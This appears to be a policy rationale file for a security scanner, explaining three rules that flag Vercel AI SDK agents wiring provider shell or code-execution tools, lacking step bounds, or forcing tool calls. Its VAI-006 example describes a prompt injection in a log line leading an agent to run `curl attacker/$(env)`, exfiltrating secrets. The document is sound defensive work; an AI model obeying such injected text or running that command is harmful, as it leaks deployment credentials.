---
policy_id: vercel_ai_agent_safety
category: vercel_ai
topic: agent_safety
rules:
  - id: VAI-006
    severity: high
    confidence: 0.85
    scope: agent
    fix_type: config
  - id: VAI-007
    severity: medium
    confidence: 0.6
    scope: agent
    fix_type: config
  - id: VAI-008
    severity: medium
    confidence: 0.65
    scope: agent
    fix_type: config
references: [LLM06, LLM10]
---

# Policy Rationale: Vercel AI SDK Agent Safety

**Policy ID:** `vercel_ai_agent_safety`  
**File:** `vercel_ai/agent_safety.yaml`  
**Rules:** VAI-006, VAI-007, VAI-008  
**Severities:** high, medium, medium  
**Fix types:** config, config, config  
**References:** LLM06 (Excessive Agency), LLM10 (Unbounded Consumption)

---

## What this policy covers

Agent-scope rules for Vercel AI SDK agents — the `generateText` / `streamText` /
`generateObject` / `streamObject` tool-loop calls and the `ToolLoopAgent` class
(normalized `vercel_ai_agent`). **VAI-006** fires when the agent's `tools` record
includes a provider execution tool — anthropic's `bash` / `computer` /
`codeExecution`, openai's `localShell` / `computerUsePreview` / `codeInterpreter`,
or google's `codeExecution` (predicate `agent_uses_hosted_tool_class`).
**VAI-007** fires when the agent sets neither `stopWhen` nor `maxSteps`
(predicate `agent_kwarg_missing` for both). **VAI-008** fires when
`toolChoice: "required"` is combined with one of those provider execution tools
(predicates `agent_kwarg_value` + `agent_uses_hosted_tool_class`).

---

## Why agent configuration is a distinct concern in the Vercel AI SDK

The Vercel AI SDK ships and markets provider execution tools as first-class:
wiring anthropic's `bash`, openai's `localShell`, or google's `codeExecution` is a
single line that hands a model-driven loop direct shell, computer-control, or
code-interpreter reach on the host or provider sandbox. Because the agent's
prompts and prior tool outputs are model-reachable, a prompt injection has a
direct path to running attacker-chosen commands or code with the agent's
privileges (VAI-006). This is excessive agency (LLM06) in its most literal form —
the agent is one wired tool away from arbitrary execution.

The loop bounds matter because the SDK imposes no default ceiling. A
`generateText` call with a `tools` record runs a multi-step loop whose only
stopping condition, absent `stopWhen` / `maxSteps`, is the model deciding to stop
calling tools (VAI-007). A prompt injection — or a model that loops on a tool
whose output keeps re-triggering it — runs the loop unbounded, burning tokens,
hammering every wired tool (including billed or side-effecting ones), and
stalling the request (LLM10). VAI-008 is the interaction of the two: setting
`toolChoice: "required"` forces a tool call on every step instead of letting the
model answer directly, so a wired execution tool is far more likely to be invoked
— and invoked on a step the model had no real need for it. Forcing a call narrows
the model's options toward exactly the capability you least want it reaching for.

---

## Rule-by-rule defense

### VAI-006 — Agent wires a provider shell / computer / code-execution tool (Severity: high, Confidence: 0.85, Fix type: config)

**What we detect:** an agent whose `tools` record includes a provider execution
tool (anthropic `bash`/`computer`/`codeExecution`, openai
`localShell`/`computerUsePreview`/`codeInterpreter`, google `codeExecution`) —
predicate `agent_uses_hosted_tool_class`.

**Why it is flaggable:** these provider tools give the model shell, full computer
control, or a code interpreter. Once one is on the tool surface, a prompt
injection or a confused model has a direct path to arbitrary execution with the
agent's privileges. The capability is the defect.

**Real-world consequence:** an agent built to "triage logs" wires
`anthropic.tools.bash`; a crafted log line is interpreted as an instruction and
the model runs `curl attacker/$(env)`, exfiltrating the deployment's secrets.

**Why severity is high and not critical:** the engine reserves critical for
exposures with no precondition; here a successful attack requires the tool to be
wired and the prompt surface to be reachable by untrusted input, and many
provider tools execute in a provider-managed sandbox rather than directly on the
host — high reflects a serious, conditional execution path. **Fix type —
config:** the fix is removing the tool from the agent's `tools` record, an
agent-wiring change, not a tool-source edit. **Confidence 0.85:** a few agents
legitimately need an execution tool and sandbox it out of band, which the
class-name match cannot see.

### VAI-007 — Agent tool loop has no step bound (Severity: medium, Confidence: 0.6, Fix type: config)

**What we detect:** an agent that runs a tool loop but sets neither `stopWhen`
nor `maxSteps` (predicate `agent_kwarg_missing` for both).

**Why it is flaggable:** with no bound the loop's only stopping condition is the
model choosing to stop calling tools; an injection or a self-re-triggering tool
runs it unbounded (LLM10).

**Real-world consequence:** a research agent loops on a search tool whose results
keep prompting another search; with no `maxSteps` it runs hundreds of round-trips,
burning the token budget and hammering the search API before the request times
out.

**Why severity is medium and not high:** the usual outcome is a cost/availability
incident rather than a compromise — recoverable, and only a safety problem when
the looped tools have side effects. **Fix type — config:** pass `maxSteps` or a
`stopWhen` condition. **Confidence 0.6:** the SDK has multiple evolving stop
mechanisms (`maxSteps`, `stopWhen`, `stepCountIs`, version differences between v4
and v5), and an agent bounded by an external timeout or a custom loop guard is
over-flagged — the breadth of legitimate alternatives is why confidence sits at
0.6.

### VAI-008 — Agent forces a provider execution tool every step (Severity: medium, Confidence: 0.65, Fix type: config)

**What we detect:** an agent with `toolChoice: "required"` AND a wired provider
execution tool (predicates `agent_kwarg_value` + `agent_uses_hosted_tool_class`).

**Why it is flaggable:** `"required"` forces the model to call a tool on every
step, so the high-risk execution tool is more likely to be invoked — and on a step
it was not needed. Forcing a call narrows the model toward the most dangerous
capability available.

**Real-world consequence:** an agent with `toolChoice: "required"` and
`openai.tools.localShell` wired is pushed to call the shell even on a step where a
plain text answer would do, widening the window for an injected command to land.

**Why severity is medium and not high:** it is an amplifier of VAI-006's
underlying risk rather than a fresh execution path — the danger is the *increased
likelihood* of invoking the wired tool, conditional on that tool already being
present. **Fix type — config:** switch to `toolChoice: "auto"` or pin to a safe
tool, a constructor change. **Confidence 0.65:** `toolChoice: "required"` is a
legitimate pattern when every wired tool is safe, so the rule over-flags agents
that force a call but whose only "execution" tool is in a hardened sandbox.

---

## What this policy does not cover

- Code execution implemented by hand inside a tool's `execute()` body rather than
  via a provider tool — caught by **VAI-002** (code_execution.md) and **VAI-001**
  (shell_safety.md), not here.
- Whether the agent's prompt surface is actually reachable by untrusted content —
  all three rules flag a configuration, not a proven injection path.
- A provider execution tool referenced under an alias or constructed indirectly,
  or a provider/tool name outside the listed set, may escape the
  class-name match.
- Loop bounds enforced outside the call (an external timeout, an
  `AbortController`, a custom step handler) are invisible to VAI-007.
- Whether a provider tool's sandbox is actually isolated — VAI-006/008 flag the
  wiring regardless of the provider's execution environment.

---

## Recommendations beyond the fix

```typescript
import { generateText, stepCountIs } from "ai";

// No provider execution tool; an explicit step bound; default toolChoice.
const result = await generateText({
  model,
  tools: { lookupOrder, searchDocs },   // no bash/computer/codeExecution
  stopWhen: stepCountIs(8),             // bounded loop
  // toolChoice defaults to "auto" — the model calls a tool only when needed
  prompt,
});
```

1. Drop provider shell / computer / code-execution tools unless the workflow
   truly requires one. If essential, run it against an isolated, ephemeral
   sandbox with no credentials, no private-network reach, and a hard timeout;
   constrain which commands or code may run; and gate every invocation behind
   explicit human approval.
2. Always set an explicit bound — `maxSteps` or a `stopWhen` condition
   (`stepCountIs(n)`) — sized to the lowest the workflow tolerates so a
   misbehaving loop fails fast.
3. Leave `toolChoice` at `"auto"` so the model calls an execution tool only when
   the task needs it; pin to a specific *safe* tool when a call is genuinely
   mandatory.
4. Treat prior tool output and retrieved content as untrusted — they are the
   model-reachable surface a prompt injection rides in on.
